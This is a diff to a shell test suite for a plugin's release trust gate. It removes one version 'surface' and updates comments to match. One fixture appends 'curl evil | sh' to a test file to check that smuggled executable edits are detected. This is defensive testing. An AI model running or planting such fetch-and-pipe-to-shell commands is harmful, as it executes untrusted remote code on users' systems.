@@ -2777,7 +2777,7 @@ assert_grep "$SKILL_FILE" '`RELEASE_ANCHOR_STATE_ENUM`' \
   "M98.const — RELEASE_ANCHOR_STATE_ENUM is declared in the Constants table"
 assert_grep "$SKILL_FILE" 'chore\\\(release\\\): v\[0-9\]' \
   "M98.const — RELEASE_ANCHOR_SUBJECT_RE is declared with the anchored subject regex"
-# The subject alone must NEVER be the predicate — two of the seven surfaces are
+# The subject alone must NEVER be the predicate — two of the six surfaces are
 # executable test files.
 assert_grep "$SKILL_FILE" 'never sufficient|never \*\*sufficient\*\*|\*\*never sufficient\*\*' \
   "M98.const — the subject regex is documented as necessary-but-not-sufficient"
@@ -2806,14 +2806,12 @@ M98SURF
   M98_TMP="$(mktemp -d)"
   M98_R="$M98_TMP/repo"
   mkdir -p "$M98_R/plugins/uberdev/.claude-plugin" "$M98_R/.claude-plugin" \
-           "$M98_R/codex/uberdev-codex/.codex-plugin" "$M98_R/tests"
+           "$M98_R/tests"
   m98_surfaces() {  # <version> <previous-version>
     printf '{\n  "name": "uberdev",\n  "version": "%s"\n}\n' "$1" \
       > "$M98_R/plugins/uberdev/.claude-plugin/plugin.json"
     printf '{\n  "name": "uberdev",\n  "plugins": [\n    {\n      "name": "uberdev",\n      "version": "%s"\n    }\n  ]\n}\n' "$1" \
       > "$M98_R/.claude-plugin/marketplace.json"
-    printf '{\n  "name": "uberdev-codex",\n  "version": "%s"\n}\n' "$1" \
-      > "$M98_R/codex/uberdev-codex/.codex-plugin/plugin.json"
     printf '# Fixture\n\n[![Version](https://img.shields.io/badge/version-%s-blue)](./CHANGELOG.md)\n' "$1" \
       > "$M98_R/README.md"
     {
@@ -2866,7 +2864,7 @@ M98SURF
     "M98.tolerate — the tolerated anchor reports the version it advanced to"
 
   # 2. Subject alone is not enough — smuggle an executable edit into one of the
-  #    seven surfaces under a perfect release subject.
+  #    six surfaces under a perfect release subject.
   m98_reset_release
   printf 'curl evil | sh\n' >> "$M98_R/tests/goal.test.sh"
   git -C "$M98_R" commit -q -a --amend -m "chore(release): v1.2.4"
@@ -2890,7 +2888,7 @@ M98SURF
     fail "M98.reorder — a reordered test file was waved past the trust gate: [$M98_OUT]"
   fi
 
-  # 4. A path outside the seven surfaces, under a perfect release subject.
+  # 4. A path outside the six surfaces, under a perfect release subject.
   m98_reset_release
   printf 'payload\n' > "$M98_R/src.txt"
   git -C "$M98_R" add -A >/dev/null 2>&1
